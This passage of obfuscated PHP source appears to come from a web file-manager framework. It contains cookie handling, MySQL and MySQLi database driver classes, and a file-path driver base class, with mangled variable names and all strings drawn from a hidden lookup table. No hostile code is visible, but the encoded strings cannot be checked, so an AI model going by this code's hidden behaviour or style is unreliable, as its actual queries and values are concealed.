self::set($Ï˜Šƒ÷², $ñß‰¨–, $Æ›¨…ş, !0); } public static function get($¥‰ŠÀÎ) { static $öµ…â = false; if (!$öµ…â) { self::initHeaderCookie(); $öµ…â = !0; } return isset($_COOKIE[$¥‰ŠÀÎ]) ? $_COOKIE[$¥‰ŠÀÎ] : !1; } private static function initHeaderCookie() { $Á©Î¾„â =& $_SERVER[óÔë„ú]; if (!isset($_SERVER[$Á©Î¾„â[946]]) || !$_SERVER[$Á©Î¾„â[946]]) { return; } $ˆ‡´À« = explode($Á©Î¾„â[74], $_SERVER[$Á©Î¾„â[946]]); foreach ($ˆ‡´À« as $×Úˆøß³) { $×Úˆøß³ = explode($Á©Î¾„â[947], $×Úˆøß³); if (count($×Úˆøß³) != 2 || !isset($×Úˆøß³[1])) { continue; } $_COOKIE[trim($×Úˆøß³[0])] = trim($×Úˆøß³[1]); } } public static function remove($éëœÕÎØ, $‘Æù­ú¨ = false) { unset($_COOKIE[$éëœÕÎØ]); self::set($éëœÕÎØ, $_SERVER[óÔë„ú][12], 1, $‘Æù­ú¨); } } class DbMysql extends Db { public function __construct($¸èÔõµ = '') { $ùğóˆ™ú =& $_SERVER[óÔë„ú]; if (!extension_loaded($ùğóˆ™ú[864])) { think_exception(think_lang($ùğóˆ™ú[14]) . $ùğóˆ™ú[948]); } if (!empty($¸èÔõµ)) { $this->config = $¸èÔõµ; if (empty($this->config[$ùğóˆ™ú[17]])) { $this->config[$ùğóˆ™ú[17]] = $ùğóˆ™ú[12]; } } } public function connect($ğº¹şÅ­ = '', $Ç¢‹¹Æ = 0, $ôõí˜âò = false) { $ÑÎİÍÒ— =& $_SERVER[óÔë„ú]; if (!isset($this->linkID[$Ç¢‹¹Æ])) { if (empty($ğº¹şÅ­)) { $ğº¹şÅ­ = $this->config; } $À±Šß = $ğº¹şÅ­[$ÑÎİÍÒ—[949]] . ($ğº¹şÅ­[$ÑÎİÍÒ—[950]] ? "\x3a{$ğº¹şÅ­[$ÑÎİÍÒ—[950]]}" : $ÑÎİÍÒ—[12]); $âı÷æÉœ = !empty($ğº¹şÅ­[$ÑÎİÍÒ—[17]][$ÑÎİÍÒ—[18]]) ? $ğº¹şÅ­[$ÑÎİÍÒ—[17]][$ÑÎİÍÒ—[18]] : $this->pconnect; if ($âı÷æÉœ) { $this->linkID[$Ç¢‹¹Æ] = mysql_pconnect($À±Šß, $ğº¹şÅ­[$ÑÎİÍÒ—[951]], $ğº¹şÅ­[$ÑÎİÍÒ—[952]], 131072); } else { $this->linkID[$Ç¢‹¹Æ] = mysql_connect($À±Šß, $ğº¹şÅ­[$ÑÎİÍÒ—[951]], $ğº¹şÅ­[$ÑÎİÍÒ—[952]], !0, 131072); } if (!$this->linkID[$Ç¢‹¹Æ] || !empty($ğº¹şÅ­[$ÑÎİÍÒ—[21]]) && !mysql_select_db($ğº¹şÅ­[$ÑÎİÍÒ—[21]], $this->linkID[$Ç¢‹¹Æ])) { think_exception(mysql_error()); } $ÕëĞ÷«’ = mysql_get_server_info($this->linkID[$Ç¢‹¹Æ]); mysql_query($ÑÎİÍÒ—[953] . think_config($ÑÎİÍÒ—[954]) . $ÑÎİÍÒ—[58], $this->linkID[$Ç¢‹¹Æ]); if ($ÕëĞ÷«’ > $ÑÎİÍÒ—[955]) { mysql_query($ÑÎİÍÒ—[956], $this->linkID[$Ç¢‹¹Æ]); } $this->connected = !0; if (1 != think_config($ÑÎİÍÒ—[22])) { unset($this->config); } } return $this->linkID[$Ç¢‹¹Æ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($»Ô¶Â‚¢) { $ñÒ  ã =& $_SERVER[óÔë„ú]; if (0 === stripos($»Ô¶Â‚¢, $ñÒ  ã[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»Ô¶Â‚¢; if ($this->queryID) { $this->free(); } think_action_status($ñÒ  ã[23], 1); think_status($ñÒ  ã[24]); $this->queryID = mysql_query($»Ô¶Â‚¢, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¦â¸Ë•î) { $Ì»´±’İ =& $_SERVER[óÔë„ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¦â¸Ë•î; if ($this->queryID) { $this->free(); } think_action_status($Ì»´±’İ[25], 1); think_status($Ì»´±’İ[24]); $œ¡ßı‡€ = mysql_query($¦â¸Ë•î, $this->_linkID); $this->debug(); if (!1 === $œ¡ßı‡€) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[óÔë„ú][957], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÍÄ•ûûÃ = mysql_query($_SERVER[óÔë„ú][958], $this->_linkID); $this->transTimes = 0; if (!$ÍÄ•ûûÃ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $·‘şë‚Û = mysql_query($_SERVER[óÔë„ú][959], $this->_linkID); $this->transTimes = 0; if (!$·‘şë‚Û) { $this->error(); return !1; } } return !0; } private function getAll() { $¶·¹·ÔÆ = array(); if ($this->numRows > 0) { while ($§÷Ë»ô³ = mysql_fetch_assoc($this->queryID)) { $¶·¹·ÔÆ[] = $§÷Ë»ô³; } mysql_data_seek($this->queryID, 0); } return $¶·¹·ÔÆ; } public function getFields($¦ÄÚÖ©…) { $ŒÚÜ’à´ =& $_SERVER[óÔë„ú]; $ğ‰÷¸¿­ = $this->query($ŒÚÜ’à´[960] . $this->parseKey($¦ÄÚÖ©…)); $òûµ¢–¸ = array(); if ($ğ‰÷¸¿­) { foreach ($ğ‰÷¸¿­ as $“òÖØÒ´ => $ºÊ¥µì) { $òûµ¢–¸[$ºÊ¥µì[$ŒÚÜ’à´[31]]] = array($ŒÚÜ’à´[32] => $ºÊ¥µì[$ŒÚÜ’à´[31]], $ŒÚÜ’à´[33] => $ºÊ¥µì[$ŒÚÜ’à´[34]], $ŒÚÜ’à´[35] => (bool) (strtoupper($ºÊ¥µì[$ŒÚÜ’à´[36]]) === $ŒÚÜ’à´[961]), $ŒÚÜ’à´[37] => $ºÊ¥µì[$ŒÚÜ’à´[38]], $ŒÚÜ’à´[39] => strtolower($ºÊ¥µì[$ŒÚÜ’à´[40]]) == $ŒÚÜ’à´[41], $ŒÚÜ’à´[42] => strtolower($ºÊ¥µì[$ŒÚÜ’à´[43]]) == $ŒÚÜ’à´[44]); } } return $òûµ¢–¸; } public function getTables($†—Éšµê = '') { $üæúº· =& $_SERVER[óÔë„ú]; if (!empty($†—Éšµê)) { $ß€§Â„ì = $üæúº·[962] . $†—Éšµê . $üæúº·[963]; } else { $ß€§Â„ì = $üæúº·[964]; } $íÔ ˜‡û = $this->query($ß€§Â„ì); $°›˜âî® = array(); foreach ($íÔ ˜‡û as $ÏÅ§¥ô³ => $œ‹®«–ù) { $°›˜âî®[$ÏÅ§¥ô³] = current($œ‹®«–ù); } return $°›˜âî®; } public function replace($Â•Ò«ã†, $áäéÃÄ’ = array()) { $­ÔšøÓŞ =& $_SERVER[óÔë„ú]; foreach ($Â•Ò«ã† as $ê¶ÅÌØ => $É”¨òíÏ) { $†ü·ÂšÉ = $this->parseValue($É”¨òíÏ); if (is_scalar($†ü·ÂšÉ)) { $‰ïíîïâ[] = $†ü·ÂšÉ; $ÖŠ‘•éÑ[] = $this->parseKey($ê¶ÅÌØ); } } $ÁÓœßñæ = $­ÔšøÓŞ[965] . $this->parseTable($áäéÃÄ’[$­ÔšøÓŞ[356]]) . $­ÔšøÓŞ[966] . implode($­ÔšøÓŞ[50], $ÖŠ‘•éÑ) . $­ÔšøÓŞ[967] . implode($­ÔšøÓŞ[50], $‰ïíîïâ) . $­ÔšøÓŞ[968]; return $this->execute($ÁÓœßñæ); } public function insertAll($İÀ¿Íêæ, $Òã¢üˆ = array(), $®¿ˆ„¼ë = false) { $ç ­é¤© =& $_SERVER[óÔë„ú]; if (!is_array($İÀ¿Íêæ[0])) { return !1; } $¤¨„®ó‡ = array_keys($İÀ¿Íêæ[0]); $ÚÓ—™ˆò = array(); foreach ($İÀ¿Íêæ as $Øê½£Ï) { $êÉç°‚˜ = array(); foreach ($Øê½£Ï as $İ›æ”Œò => $ıÔĞşß) { $ıÔĞşß = $this->parseValue($ıÔĞşß); if (is_scalar($ıÔĞşß)) { $êÉç°‚˜[] = $ıÔĞşß; } } $ÚÓ—™ˆò[] = $ç ­é¤©[337] . implode($ç ­é¤©[50], $êÉç°‚˜) . $ç ­é¤©[968]; } array_walk($¤¨„®ó‡, array($this, $ç ­é¤©[969])); $Ú¾ÉÅ†Ê = ($®¿ˆ„¼ë ? $ç ­é¤©[970] : $ç ­é¤©[971]) . $ç ­é¤©[972] . $this->parseTable($Òã¢üˆ[$ç ­é¤©[356]]) . $ç ­é¤©[966] . implode($ç ­é¤©[50], $¤¨„®ó‡) . $ç ­é¤©[973] . implode($ç ­é¤©[50], $ÚÓ—™ˆò); return $this->execute($Ú¾ÉÅ†Ê); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ê­’ÃŒà =& $_SERVER[óÔë„ú]; $this->error = mysql_errno() . $Ê­’ÃŒà[4] . mysql_error($this->_linkID); if ($Ê­’ÃŒà[12] != $this->queryStr) { $this->error .= LNG($Ê­’ÃŒà[48]) . $this->queryStr; } think_trace($this->error, $Ê­’ÃŒà[12], $Ê­’ÃŒà[49]); return $this->error; } public function escapeString($À ¹£§) { if ($this->_linkID) { return mysql_real_escape_string($À ¹£§, $this->_linkID); } else { return mysql_escape_string($À ¹£§); } } public function parseKey(&$Í¶µ­‰ø, $ß¥ £ = true) { $û¦èÎõÒ =& $_SERVER[óÔë„ú]; if ($ß¥ £) { $Í¶µ­‰ø = $this->parseKeyCheck($Í¶µ­‰ø); } if ($Í¶µ­‰ø != $û¦èÎõÒ[220] && !preg_match($û¦èÎõÒ[974], $Í¶µ­‰ø)) { $Í¶µ­‰ø = $û¦èÎõÒ[461] . trim($Í¶µ­‰ø, $û¦èÎõÒ[461]) . $û¦èÎõÒ[461]; } return $Í¶µ­‰ø; } } class DbMysqli extends Db { public function __construct($°•§ëÜÂ = '') { $ÖïàûØ‹ =& $_SERVER[óÔë„ú]; if (!extension_loaded($ÖïàûØ‹[975])) { think_exception(think_lang($ÖïàûØ‹[14]) . $ÖïàûØ‹[976]); } if (!empty($°•§ëÜÂ)) { $this->config = $°•§ëÜÂ; if (empty($this->config[$ÖïàûØ‹[17]])) { $this->config[$ÖïàûØ‹[17]] = $ÖïàûØ‹[12]; } } } public function connect($¾´Öèê¦ = '', $»ßŸ®·¬ = 0) { $Úç¬ó¼ =& $_SERVER[óÔë„ú]; if (!isset($this->linkID[$»ßŸ®·¬])) { if (empty($¾´Öèê¦)) { $¾´Öèê¦ = $this->config; } $this->linkID[$»ßŸ®·¬] = new mysqli($¾´Öèê¦[$Úç¬ó¼[949]], $¾´Öèê¦[$Úç¬ó¼[951]], $¾´Öèê¦[$Úç¬ó¼[952]], $¾´Öèê¦[$Úç¬ó¼[21]], $¾´Öèê¦[$Úç¬ó¼[950]] ? intval($¾´Öèê¦[$Úç¬ó¼[950]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $õğñ²×ê = $this->linkID[$»ßŸ®·¬]->server_version; $this->linkID[$»ßŸ®·¬]->query($Úç¬ó¼[953] . think_config($Úç¬ó¼[954]) . $Úç¬ó¼[58]); if ($õğñ²×ê > $Úç¬ó¼[955]) { $this->linkID[$»ßŸ®·¬]->query($Úç¬ó¼[956]); } $this->connected = !0; if (1 != think_config($Úç¬ó¼[22])) { unset($this->config); } } return $this->linkID[$»ßŸ®·¬]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ÿ¢…³Ø«) { $İò©ü‹ =& $_SERVER[óÔë„ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ¢…³Ø«; if ($this->queryID) { $this->free(); } think_action_status($İò©ü‹[23], 1); think_status($İò©ü‹[24]); $this->queryID = $this->_linkID->query($Ÿ¢…³Ø«); if ($this->_linkID->more_results()) { while (($¼µ‰úı = $this->_linkID->next_result()) != NULL) { $¼µ‰úı->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¥‡ıØ×“) { $¯¥½Ê¯‚ =& $_SERVER[óÔë„ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥‡ıØ×“; if ($this->queryID) { $this->free(); } think_action_status($¯¥½Ê¯‚[25], 1); think_status($¯¥½Ê¯‚[24]); $§Áİ™Ëë = $this->_linkID->query($¥‡ıØ×“); $this->debug(); if (!1 === $§Áİ™Ëë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ê„ÑÖ‡ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Ê„ÑÖ‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ä–Õ×¬° = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ä–Õ×¬°) { $this->error(); return !1; } } return !0; } private function getAll() { $è€’ƒ‘ = array(); if ($this->numRows > 0) { for ($¸¾®Ò¢ = 0; $¸¾®Ò¢ < $this->numRows; $¸¾®Ò¢++) { $è€’ƒ‘[$¸¾®Ò¢] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $è€’ƒ‘; } public function getFields($Èò¡‡Ëé) { $ùıÓ¿™ú =& $_SERVER[óÔë„ú]; $À›Å¯Á° = $this->query($ùıÓ¿™ú[960] . $this->parseKey($Èò¡‡Ëé)); $µ¬Õ×ù¤ = array(); if ($À›Å¯Á°) { foreach ($À›Å¯Á° as $œÂàø‹³ => $Å¦úÊ) { $µ¬Õ×ù¤[$Å¦úÊ[$ùıÓ¿™ú[31]]] = array($ùıÓ¿™ú[32] => $Å¦úÊ[$ùıÓ¿™ú[31]], $ùıÓ¿™ú[33] => $Å¦úÊ[$ùıÓ¿™ú[34]], $ùıÓ¿™ú[35] => (bool) ($Å¦úÊ[$ùıÓ¿™ú[36]] === $ùıÓ¿™ú[12]), $ùıÓ¿™ú[37] => $Å¦úÊ[$ùıÓ¿™ú[38]], $ùıÓ¿™ú[39] => strtolower($Å¦úÊ[$ùıÓ¿™ú[40]]) == $ùıÓ¿™ú[41], $ùıÓ¿™ú[42] => strtolower($Å¦úÊ[$ùıÓ¿™ú[43]]) == $ùıÓ¿™ú[44]); } } return $µ¬Õ×ù¤; } public function getTables($çÊï§å† = '') { $Õ©èŠóß =& $_SERVER[óÔë„ú]; $ƒô¨— = !empty($çÊï§å†) ? $Õ©èŠóß[962] . $çÊï§å† . $Õ©èŠóß[963] : $Õ©èŠóß[964]; $£àÖØª¤ = $this->query($ƒô¨—); $¾ğ¼°ò² = array(); if ($£àÖØª¤) { foreach ($£àÖØª¤ as $ÆŞßÃ‰æ => $´ÓáíÚ) { $¾ğ¼°ò²[$ÆŞßÃ‰æ] = current($´ÓáíÚ); } } return $¾ğ¼°ò²; } public function replace($îŞ‚°şè, $Ù–õƒ“ã = array()) { $—Êü®Ò =& $_SERVER[óÔë„ú]; foreach ($îŞ‚°şè as $»æÒ˜êë => $¢ÑâÉÅ…) { $ã‡ÍÑÙ™ = $this->parseValue($¢ÑâÉÅ…); if (is_scalar($ã‡ÍÑÙ™)) { $³šãšÇà[] = $ã‡ÍÑÙ™; $ËìÇº[] = $this->parseKey($»æÒ˜êë); } } $´éìàş = $—Êü®Ò[965] . $this->parseTable($Ù–õƒ“ã[$—Êü®Ò[356]]) . $—Êü®Ò[966] . implode($—Êü®Ò[50], $ËìÇº) . $—Êü®Ò[967] . implode($—Êü®Ò[50], $³šãšÇà) . $—Êü®Ò[968]; return $this->execute($´éìàş); } public function insertAll($¢™â›î, $£À¤¤©§ = array(), $œŠÇ±¾ê = false) { $ÔËßÏ¶‡ =& $_SERVER[óÔë„ú]; if (!is_array($¢™â›î[0])) { return !1; } $ñ›Ë³ãá = array_keys($¢™â›î[0]); $›¸ÆÈÎò = array(); foreach ($¢™â›î as $”îÑ¨Ê½) { $œÉò–Ó = array(); foreach ($”îÑ¨Ê½ as $Òºü·Øƒ => $ÈòŸÀË) { $ÈòŸÀË = $this->parseValue($ÈòŸÀË); if (is_scalar($ÈòŸÀË)) { $œÉò–Ó[] = $ÈòŸÀË; } } $›¸ÆÈÎò[] = $ÔËßÏ¶‡[337] . implode($ÔËßÏ¶‡[50], $œÉò–Ó) . $ÔËßÏ¶‡[968]; } array_walk($ñ›Ë³ãá, array($this, $ÔËßÏ¶‡[969])); $¤°®€ôÁ = $œŠÇ±¾ê ? $ÔËßÏ¶‡[970] : $ÔËßÏ¶‡[971]; $‘¨Ùº¾ = $¤°®€ôÁ . $ÔËßÏ¶‡[972] . $this->parseTable($£À¤¤©§[$ÔËßÏ¶‡[356]]) . $ÔËßÏ¶‡[966] . implode($ÔËßÏ¶‡[50], $ñ›Ë³ãá) . $ÔËßÏ¶‡[973] . implode($ÔËßÏ¶‡[50], $›¸ÆÈÎò); return $this->execute($‘¨Ùº¾); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ôè×Ÿ´ =& $_SERVER[óÔë„ú]; $this->error = $this->_linkID->errno . $Ôè×Ÿ´[4] . $this->_linkID->error; if ($Ôè×Ÿ´[12] != $this->queryStr) { $this->error .= LNG($Ôè×Ÿ´[48]) . $this->queryStr; } think_trace($this->error, $Ôè×Ÿ´[12], $Ôè×Ÿ´[49]); return $this->error; } public function escapeString($ª¥ßÑ½) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ª¥ßÑ½); } else { return addslashes($ª¥ßÑ½); } } public function parseKey(&$ í›œ¸¶, $ş“°¢›• = true) { $—üˆ®² =& $_SERVER[óÔë„ú]; if ($ş“°¢›•) { $ í›œ¸¶ = $this->parseKeyCheck($ í›œ¸¶); } if ($ í›œ¸¶ != $—üˆ®²[220] && !preg_match($—üˆ®²[974], $ í›œ¸¶)) { $ í›œ¸¶ = $—üˆ®²[461] . trim($ í›œ¸¶, $—üˆ®²[461]) . $—üˆ®²[461]; } return $ í›œ¸¶; } } goto c“‚òÌí£ğ; AàÇÑãÒÖ¥: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ª“ê˜Æ =& $_SERVER[óÔë„ú]; $this->objectDriver = array($ª“ê˜Æ[60], $ª“ê˜Æ[61], $ª“ê˜Æ[62], $ª“ê˜Æ[63], $ª“ê˜Æ[64], $ª“ê˜Æ[65], $ª“ê˜Æ[66], $ª“ê˜Æ[67], $ª“ê˜Æ[68], $ª“ê˜Æ[69], $ª“ê˜Æ[70], $ª“ê˜Æ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($‰ŠÒÈÂ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($‰ŠÒÈÂ, $_SERVER[óÔë„ú][8]); } return $‰ŠÒÈÂ; } public function iconvApp($Û˜‰ ÌÙ) { return $Û˜‰ ÌÙ; } public function iconvSystem($îŒ˜™­ß) { return $îŒ˜™­ß; } public function iconvTo($Ïª÷‰èŸ, $Æ¹ì¾º, $ÏºñÙ¨„) { $­¼ü‘¦ =& $_SERVER[óÔë„ú]; if (!$Ïª÷‰èŸ || !function_exists($­¼ü‘¦[72])) { return $Ïª÷‰èŸ; } static $ûµò›Õ = array(); $ÑÓ´Òˆ“ = $Æ¹ì¾º . $­¼ü‘¦[73] . $ÏºñÙ¨„ . $­¼ü‘¦[74] . $Ïª÷‰èŸ; if (isset($ûµò›Õ[$ÑÓ´Òˆ“])) { return $ûµò›Õ[$ÑÓ´Òˆ“]; } if (function_exists($­¼ü‘¦[75])) { $Üí¥äæÖ = @mb_convert_encoding($Ïª÷‰èŸ, $ÏºñÙ¨„, $Æ¹ì¾º); } else { $Üí¥äæÖ = @iconv($Æ¹ì¾º, $ÏºñÙ¨„, $Ïª÷‰èŸ); } $Üí¥äæÖ = $Üí¥äæÖ ? $Üí¥äæÖ : $Ïª÷‰èŸ; if (strstr($Üí¥äæÖ, $­¼ü‘¦[76])) { $Üí¥äæÖ = str_replace($­¼ü‘¦[76], $­¼ü‘¦[11], $Üí¥äæÖ); } $ûµò›Õ[$Æ¹ì¾º . $­¼ü‘¦[73] . $ÏºñÙ¨„ . $­¼ü‘¦[74] . $Ïª÷‰èŸ] = $Üí¥äæÖ; $ûµò›Õ[$ÏºñÙ¨„ . $­¼ü‘¦[73] . $Æ¹ì¾º . $­¼ü‘¦[74] . $Ïª÷‰èŸ] = $Ïª÷‰èŸ; $ûµò›Õ[$ÏºñÙ¨„ . $­¼ü‘¦[73] . $Æ¹ì¾º . $­¼ü‘¦[74] . $Üí¥äæÖ] = $Ïª÷‰èŸ; $ûµò›Õ[$Æ¹ì¾º . $­¼ü‘¦[73] . $ÏºñÙ¨„ . $­¼ü‘¦[74] . $Üí¥äæÖ] = $Üí¥äæÖ; return $Üí¥äæÖ; } public function getPathInner($£àÆÀÙÍ) { $”ÏŸÈà‘ = IO::init($£àÆÀÙÍ); return $”ÏŸÈà‘->path; } public function getPathOuter($¤®ü¶“Í) { $£€ëæúç =& $_SERVER[óÔë„ú]; $´„¯ëä¢ = strlen(trim($this->pathBase, $£€ëæúç[8])); $¤®ü¶“Í = substr(trim($¤®ü¶“Í, $£€ëæúç[8]), $´„¯ëä¢); return $this->pathDriver . $£€ëæúç[8] . ltrim($¤®ü¶“Í, $£€ëæúç[8]); } public function isParentOf($ÍàĞÑ¿¼, $Çù”·­) { $é•Ÿõ•Ñ =& $_SERVER[óÔë„ú]; $ÍàĞÑ¿¼ = rtrim(strtolower($ÍàĞÑ¿¼), $é•Ÿõ•Ñ[8]) . $é•Ÿõ•Ñ[8]; $Çù”·­ = rtrim(strtolower($Çù”·­), $é•Ÿõ•Ñ[8]) . $é•Ÿõ•Ñ[8]; $ªµÆÃŸ… = strpos($Çù”·­, $ÍàĞÑ¿¼) === 0; return $ªµÆÃŸ…; } public function getType() { $ÀéÉıªÍ =& $_SERVER[óÔë„ú]; $÷»£¢Ÿş = str_replace($ÀéÉıªÍ[77], $ÀéÉıªÍ[12], get_class($this)); return strtolower($÷»£¢Ÿş); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ë¾è·¯Ÿ, $£ŞÃñŞÎ) { $ÚÂÔæ¢À =& $_SERVER[óÔë„ú]; $ôŠ½÷Ã = rtrim($Ë¾è·¯Ÿ, $ÚÂÔæ¢À[8]) . $ÚÂÔæ¢À[8] . $£ŞÃñŞÎ; $èÒÏ¸î­ = $this->exist($ôŠ½÷Ã); return $èÒÏ¸î­ ? $ôŠ½÷Ã : !1; } public function setModifyTime($±ïÓ›¸ , $Ù¦·ÛÕ¼ = '') { } public function renameObject($¦ÑÇ™Òù, $ÜóÎæÂã) { $ºÇâ®ª‰ = $ÜóÎæÂã; $¦ÑÇ™Òù = $this->getPathOuter($¦ÑÇ™Òù); $ÜóÎæÂã = $this->pathFather($¦ÑÇ™Òù) . $ÜóÎæÂã; $Ç¿µòÉĞ = IO::copy($¦ÑÇ™Òù, $this->pathFather($¦ÑÇ™Òù), REPEAT_RENAME_FOLDER, $ºÇâ®ª‰); if ($Ç¿µòÉĞ) { IO::remove($¦ÑÇ™Òù); } return $Ç¿µòÉĞ ? $ÜóÎæÂã : !1; } public function tempFile($¹Š™ÖÄŒ = '', $„¸†¿Í§ = '') { if (!$¹Š™ÖÄŒ) { $¹Š™ÖÄŒ = rand_string(15); } $Ğúìêüø = TEMP_FILES . rand_string(15) . $_SERVER[óÔë„ú][8]; @mkdir($Ğúìêüø, DEFAULT_PERRMISSIONS, !0); $äÆ ê¼ã = $Ğúìêüø . $¹Š™ÖÄŒ; @touch($äÆ ê¼ã); if ($„¸†¿Í§) { file_put_contents($äÆ ê¼ã, $„¸†¿Í§); } return $äÆ ê¼ã; } public function tempFileRemve($€¾ıÓÀ) { @unlink($€¾ıÓÀ); @rmdir($this->pathFather($€¾ıÓÀ)); } public function mkfile($•ŸØàˆ, $ö·Ğ»¯ı = '', $°¼†ºÎ’ = REPEAT_RENAME) { } public function mkdir($ö¶›ñåö, $Ü­úÇƒÅ = REPEAT_SKIP) { } public function delFile($—€¹€êÍ) { } public function delFolder($¦Æ—ˆ…§) { } public function copyFile($êı ßôí, $ÌÓŠ”úŠ) { } public function moveFile($‰ĞˆÄ², $°Öè¸ú) { } public function remove($åÅ–ï‡Ÿ) { if ($this->isFile($åÅ–ï‡Ÿ)) { return $this->delFile($åÅ–ï‡Ÿ); } return $this->delFolder($åÅ–ï‡Ÿ); } public function rename($´û—Ü§í, $´èÉØÕ) { } public function exist($ÕÕóŸ°û) { } public function findByHash($ôìÎ•Ù³ = '', $ÏÂÑÓ‚ = '') { return !1; } public function isFile($Ù“×Ø˜Ô) { } public function isFolder($Ç°•Â) { } public function size($ÏÀÖÃ¾ù) { } public function info($ÂœàÓß¥) { } public function infoSimple($¢’€Õíœ) { return $this->info($¢’€Õíœ); } public function infoAuth($ªš†¾€à) { return $this->info($ªš†¾€à); } public function infoFull($ØÏ¯Ú€×) { return $this->info($ØÏ¯Ú€×); } public function infoFullSimple($ñÏûú²) { return $this->info($ñÏûú²); } public function infoWithChildren($¢š—î½Ö) { $æÊí¯± =& $_SERVER[óÔë„ú]; static $åòûÒá = array(); if (isset($åòûÒá[$¢š—î½Ö])) { return $åòûÒá[$¢š—î½Ö]; } $Æ‹åÅØ“ = $this->info($¢š—î½Ö); if ($Æ‹åÅØ“ && $Æ‹åÅØ“[$æÊí¯±[33]] == $æÊí¯±[78]) { $úô¹‘Áå = array($æÊí¯±[79] => 0, $æÊí¯±[80] => 0, $æÊí¯±[81] => 0); $this->infoChildren($¢š—î½Ö, $úô¹‘Áå); $Æ‹åÅØ“[$æÊí¯±[79]] = $úô¹‘Áå[$æÊí¯±[79]]; $Æ‹åÅØ“[$æÊí¯±[82]] = array($æÊí¯±[83] => $úô¹‘Áå[$æÊí¯±[80]], $æÊí¯±[84] => $úô¹‘Áå[$æÊí¯±[81]]); $åòûÒá[$¢š—î½Ö] = $Æ‹åÅØ“; } return $Æ‹åÅØ“; } public function listPath($ù‡Í®¢Ş, $¤…Ù¾ = false) { } public function has($ƒÅàÒëü, $¦ä×‰Á” = false, $œ¦Ÿò‰Ï = false) { } public function canRead($®Çãğ£Ğ) { } public function canWrite($±û»Ë¢à) { } public function getContent($¥Ìò´«ñ) { } public function setContent($Ñº”‘, $Ä¼Í¶‡³ = '') { } protected function infoChildren($›‰¾§Ü, &$ÓòÛìç) { $ıúé§ =& $_SERVER[óÔë„ú]; check_abort_echo(); $ğ¼Šæ—÷ = $this->listPath($›‰¾§Ü, !0); $ğ¼Šæ—÷ = array_merge($ğ¼Šæ—÷[$ıúé§[85]], $ğ¼Šæ—÷[$ıúé§[86]]); foreach ($ğ¼Šæ—÷ as $ñõ˜¼Ñ³) { if ($ñõ˜¼Ñ³[$ıúé§[33]] == $ıúé§[78]) { $ÓòÛìç[$ıúé§[81]]++; $”ˆµö¶÷ = $this->getPathInner($ñõ˜¼Ñ³[$ıúé§[87]]); $this->infoChildren($”ˆµö¶÷, $ÓòÛìç); } else { $ÓòÛìç[$ıúé§[80]]++; $ÓòÛìç[$ıúé§[79]] += $ñõ˜¼Ñ³[$ıúé§[79]]; } } } public function fileSubstr($ëü¶À÷Ó, $Ä—†Ô«¸, $‚²Øµş‹) { } public function listAll($¸ØŠ«êç) { } public function listAllMake($Ã¶Ãàæˆ, &$«¸¢’¾¹) { $°ÉˆæÕø =& $_SERVER[óÔë„ú]; check_abort_echo(); $ú€ªÔÊÍ = $this->listPath($Ã¶Ãàæˆ, !0); if (!$ú€ªÔÊÍ) { return; } $©¼å°ó = array_merge($ú€ªÔÊÍ[$°ÉˆæÕø[85]], $ú€ªÔÊÍ[$°ÉˆæÕø[86]]); foreach ($©¼å°ó as $ÎÙ‹çò›) { $‘ÉºšˆÊ = $ÎÙ‹çò›[$°ÉˆæÕø[33]] == $°ÉˆæÕø[78]; $İÕ…ÎŞŠ = array($°ÉˆæÕø[87] => $ÎÙ‹çò›[$°ÉˆæÕø[87]], $°ÉˆæÕø[78] => $‘ÉºšˆÊ); if (isset($ÎÙ‹çò›[$°ÉˆæÕø[79]])) { $İÕ…ÎŞŠ[$°ÉˆæÕø[79]] = $ÎÙ‹çò›[$°ÉˆæÕø[79]]; } if (isset($ÎÙ‹çò›[$°ÉˆæÕø[88]])) { $İÕ…ÎŞŠ[$°ÉˆæÕø[88]] = $ÎÙ‹çò›[$°ÉˆæÕø[88]]; } if (!$‘ÉºšˆÊ) { $«¸¢’¾¹[] = $İÕ…ÎŞŠ; continue; } $«¸¢’¾¹[] = $İÕ…ÎŞŠ; $÷ â¤ı¥ = $ÎÙ‹çò›[$°ÉˆæÕø[87]]; $Ü­åÙŞĞ = $this->pathDriver; if 